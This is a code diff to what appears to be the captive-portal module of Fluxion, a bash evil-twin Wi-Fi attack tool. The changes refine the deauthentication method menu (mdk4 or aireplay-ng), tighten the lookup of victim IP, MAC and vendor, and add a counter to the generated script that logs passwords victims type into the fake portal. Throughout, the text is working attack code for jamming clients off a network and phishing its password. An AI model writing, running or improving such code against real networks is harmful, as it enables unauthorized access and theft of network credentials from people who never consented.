@@ -166,12 +166,24 @@ function captive_portal_set_ap_service() {
 
   captive_portal_unset_ap_service
 
-fluxion_header
+  fluxion_header
 
-echo -e "$FLUXIONVLine ${CClr}Select a method of deauthentication\n${CClr}"
-echo -e "${CSRed}[${CSYel}1${CSRed}]${CClr} mdk4${CClr}"
-echo -e "${CSRed}[${CSYel}2${CSRed}]${CClr} aireplay${CClr}"
-read -p $'\e[0;31m[\e[1;34mfluxion\e[1;33m@\e[1;37m'"$HOSTNAME"$'\e[0;31m]\e[0;31m-\e[0;31m[\e[1;33m~\e[0;31m] \e[0m' option_deauth
+  echo -e "$FLUXIONVLine Select deauthentication method"
+  echo
+
+  local deauthChoices=(
+    "mdk4 (Recommended - targeted deauth, more reliable)"
+    "aireplay-ng (Classic - simple broadcast deauth)"
+    "$FLUXIONGeneralBackOption"
+  )
+
+  io_query_choice "" deauthChoices[@]
+
+  case "$IOQueryChoice" in
+    "mdk4"*) option_deauth=1;;
+    "aireplay"*) option_deauth=2;;
+    "$FLUXIONGeneralBackOption") return 1;;
+  esac
 
 
   if [ "$FLUXIONAuto" ]; then
@@ -334,10 +346,9 @@ captive_portal_unset_certificate() {
 
 # Create Self-Signed SSL Certificate
 captive_portal_set_certificate() {
-  if [ \
-      "$CaptivePortalSSL" = "disabled" -o \
-      "$CaptivePortalSSL" = "enabled" -a \
-      -f "$FLUXIONWorkspacePath/server.pem" ]; then
+  if [[ "$CaptivePortalSSL" = "disabled" || \
+      ( "$CaptivePortalSSL" = "enabled" && \
+      -f "$FLUXIONWorkspacePath/server.pem" ) ]]; then
     echo "Captive Portal SSL mode already set to $CaptivePortalSSL!" \
       > $FLUXIONOutputDevice
     return 0
@@ -538,50 +549,60 @@ captive_portal_set_user_interface() {
 
 
 captive_portal_get_client_IP() {
-  if [ -f "$CaptivePortalPassLog/$FluxionTargetSSIDClean-$FluxionTargetMAC-IP.log" ]; then
-    MatchedClientIP=$(
-      cat "$CaptivePortalPassLog/$FluxionTargetSSIDClean-$FluxionTargetMAC-IP.log" | \
-        sed '/^\s*$/d' | tail -n 1 | head -n 1
-    )
-  else
-    MatchedClientIP="unknown"
+  local ipLogFile="$CaptivePortalPassLog/$FluxionTargetSSIDClean-$FluxionTargetMAC-IP.log"
+  local MatchedClientIP="unknown"
+
+  if [ -f "$ipLogFile" ]; then
+    # Get last non-blank line directly without unnecessary cat pipe
+    MatchedClientIP=$(sed '/^\s*$/d' "$ipLogFile" | tail -n 1)
+    if [ -z "$MatchedClientIP" ]; then
+      MatchedClientIP="unknown"
+    fi
   fi
 
-  echo $MatchedClientIP
+  echo "$MatchedClientIP"
 }
 
 captive_portal_get_IP_MAC() {
-  if [ -f "$CaptivePortalPassLog/$FluxionTargetSSIDClean-$FluxionTargetMAC-IP.log" ] && \
-    [ "$(captive_portal_get_client_IP)" != "" ] && \
+  local ipLogFile="$CaptivePortalPassLog/$FluxionTargetSSIDClean-$FluxionTargetMAC-IP.log"
+  local MatchedClientMAC="unknown"
+
+  if [ -f "$ipLogFile" ] && \
     [ -f "$FLUXIONWorkspacePath/clients.txt" ]; then
-    local IP=$(captive_portal_get_client_IP)
-    local MatchedClientMAC=$(
-      cat $FLUXIONWorkspacePath/clients.txt | \
-        grep $IP | awk '{print $5}' | grep : | head -n 1 | \
-        tr [:upper:] [:lower:]
-    )
-    if [ "$(echo $MatchedClientMAC | wc -m)" != "18" ]; then
-      local MatchedClientMAC="xx:xx:xx:xx:xx:xx"
+    local IP
+    IP=$(captive_portal_get_client_IP)
+    if [ -n "$IP" ] && [ "$IP" != "unknown" ]; then
+      MatchedClientMAC=$(
+        grep -F "$IP" "$FLUXIONWorkspacePath/clients.txt" | \
+          awk '{print $5}' | grep ':' | head -n 1 | \
+          tr '[:upper:]' '[:lower:]'
+      )
+      if [ "$(echo "$MatchedClientMAC" | wc -m)" != "18" ]; then
+        MatchedClientMAC="xx:xx:xx:xx:xx:xx"
+      fi
     fi
-  else
-    local MatchedClientMAC="unknown"
   fi
-  echo $MatchedClientMAC
+
+  echo "$MatchedClientMAC"
 }
 
 captive_portal_get_MAC_brand() {
-  if [ $(captive_portal_get_IP_MAC) != "" ]; then
-    local MACManufacturer=$( macchanger -l | \
-      grep "$(echo "$(captive_portal_get_IP_MAC)" | cut -d ":" -f -3)" | \
+  local MACManufacturer="unknown"
+  local clientMAC
+  clientMAC=$(captive_portal_get_IP_MAC)
+
+  if [ -n "$clientMAC" ] && [ "$clientMAC" != "unknown" ] && [ "$clientMAC" != "xx:xx:xx:xx:xx:xx" ]; then
+    local macPrefix
+    macPrefix=$(echo "$clientMAC" | cut -d ":" -f -3)
+    MACManufacturer=$(macchanger -l 2>/dev/null | \
+      grep "$macPrefix" | \
       cut -d " " -f 5-)
-    if echo "$MACManufacturer" | grep -q x; then
-      local MACManufacturer="unknown"
+    if [ -z "$MACManufacturer" ] || echo "$MACManufacturer" | grep -q 'x'; then
+      MACManufacturer="unknown"
     fi
-  else
-    local MACManufacturer="unknown"
   fi
 
-  echo $MACManufacturer
+  echo "$MACManufacturer"
 }
 
 
@@ -774,7 +795,7 @@ ${CaptivePortalGatewayAddress}	*.*
 
   #chmod +x "$FLUXIONWorkspacePath/fluxion_captive_portal_dns.py"
 
-  local -r targetSSIDCleanNormalized=${FluxionTargetSSIDClean//"/\\"}
+  local -r targetSSIDCleanNormalized=${FluxionTargetSSIDClean//\\/\\\\}
   # Attack arbiter script
   echo "\
 #!/usr/bin/env bash
@@ -848,6 +869,10 @@ while [ \$AuthenticatorState = \"running\" ]; do
     if [ -f \"$FLUXIONWorkspacePath/pwdattempt.txt\" -a -s \"$FLUXIONWorkspacePath/pwdattempt.txt\" ]; then
         # Save any new password attempt.
         cat \"$FLUXIONWorkspacePath/pwdattempt.txt\" >> \"$CaptivePortalPassLog/$targetSSIDCleanNormalized-$FluxionTargetMAC.log\"
+
+        # Increment the hit counter for each password attempt.
+        i=\$((\$i + 1))
+        echo \$i > \"$FLUXIONWorkspacePath/hit.txt\"
 
         # Clear logged password attempt.
         echo -n > \"$FLUXIONWorkspacePath/pwdattempt.txt\"
@@ -1118,8 +1143,9 @@ captive_portal_generic() {
     </body>
 </html>" >"$FLUXIONWorkspacePath/captive_portal/index.html"
 
-if [ $FLUXIONEnable5GHZ -eq 1 ];then
-    cp -r "$FLUXIONPath/attacks/Captive Portal/deauth-ng.py" "$FLUXIONWorkspacePath/captive_portal/deauth-ng.py"
+# Always copy deauth-ng.py for potential use
+if [ -f "$FLUXIONPath/attacks/Captive Portal/deauth-ng.py" ]; then
+    cp "$FLUXIONPath/attacks/Captive Portal/deauth-ng.py" "$FLUXIONWorkspacePath/captive_portal/deauth-ng.py"
     chmod +x "$FLUXIONWorkspacePath/captive_portal/deauth-ng.py"
 fi
 
@@ -1190,7 +1216,7 @@ captive_portal_stop_interface() {
 
 captive_portal_start_interface() {
   if [ "$CaptivePortalAPService" ]; then
-    echo -e "$FLUXIONVLine $CaptivePortalStaringAPServiceNotice"
+    echo -e "$FLUXIONVLine $CaptivePortalStartingAPServiceNotice"
     ap_service_start
   else
     fluxion_header
@@ -1210,7 +1236,7 @@ captive_portal_start_interface() {
     read -n1 -p "Press any key to continue... " bullshit
   fi
 
-  echo -e "$FLUXIONVLine $CaptivePortalStaringAPRoutesNotice"
+  echo -e "$FLUXIONVLine $CaptivePortalStartingAPRoutesNotice"
   captive_portal_set_routes &
   sleep 3
 
@@ -1484,6 +1510,14 @@ start_attack() {
   if [ "$CaptivePortalState" != "Ready" ]; then return 1; fi
   CaptivePortalState="Running"
 
+  echo -e "$FLUXIONVLine ${CGrn}Starting Captive Portal Attack...$CClr"
+  echo -e "$FLUXIONVLine Target: $CSYel$FluxionTargetSSID$CClr ($FluxionTargetMAC)"
+  echo -e "$FLUXIONVLine Channel: $FluxionTargetChannel"
+  echo -e "$FLUXIONVLine AP Service: $CaptivePortalAPService"
+  echo -e "$FLUXIONVLine Deauth: $([ "$option_deauth" = "1" ] && echo "mdk4" || echo "aireplay-ng")"
+  echo -e "$FLUXIONVLine SSL: $CaptivePortalSSL"
+  echo
+
   stop_attack
 
   if [ "$CaptivePortalNetworkManagerShutoff" != "disabled" ]; then
@@ -1565,15 +1599,23 @@ start_attack() {
   # This prevents "ARPHRD_IEEE80211" errors during tracker restarts
   # Only set mode if not already in monitor mode to avoid disrupting the interface
   echo "Verifying jammer interface monitor mode..." > $FLUXIONOutputDevice
-  local currentMode=$(iw dev "$CaptivePortalJammerInterface" info 2>/dev/null | grep -oP 'type \K\w+')
-  if [ "$currentMode" != "monitor" ]; then
-    echo "Setting jammer interface to monitor mode (current: $currentMode)..." > $FLUXIONOutputDevice
+  local currentMode=""
+  if currentMode=$(iw dev "$CaptivePortalJammerInterface" info 2>/dev/null | grep -oP 'type \K\w+'); then
+    if [ "$currentMode" != "monitor" ]; then
+      echo "Setting jammer interface to monitor mode (current: ${currentMode:-unknown})..." > $FLUXIONOutputDevice
+      if ! interface_set_mode "$CaptivePortalJammerInterface" monitor &> $FLUXIONOutputDevice; then
+        echo "Warning: Failed to set jammer interface to monitor mode" > $FLUXIONOutputDevice
+      fi
+      sleep 1
+    else
+      echo "Jammer interface already in monitor mode, skipping..." > $FLUXIONOutputDevice
+    fi
+  else
+    echo "Warning: Could not query jammer interface state, attempting to set monitor mode..." > $FLUXIONOutputDevice
     if ! interface_set_mode "$CaptivePortalJammerInterface" monitor &> $FLUXIONOutputDevice; then
       echo "Warning: Failed to set jammer interface to monitor mode" > $FLUXIONOutputDevice
     fi
     sleep 1
-  else
-    echo "Jammer interface already in monitor mode, skipping..." > $FLUXIONOutputDevice
   fi
 
   if [ $FLUXIONEnable5GHZ -eq 1 ]; then
